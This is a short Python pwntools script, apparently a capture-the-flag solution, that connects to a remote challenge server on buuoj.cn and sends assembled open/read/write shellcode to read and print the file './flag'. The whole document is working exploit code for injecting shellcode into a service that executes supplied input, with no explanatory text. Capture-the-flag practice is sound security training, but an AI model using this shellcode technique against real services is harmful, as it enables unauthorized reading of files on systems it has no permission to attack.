from pwn import *

io = remote("node4.buuoj.cn", 29378)

shellcode = shellcraft.open("./flag")
shellcode += shellcraft.read("eax", "esp", 100)
shellcode += shellcraft.write(1, "esp", 100)

payload = asm(shellcode)

io.recvuntil("Give my your shellcode:")
io.sendline(payload)

io.interactive()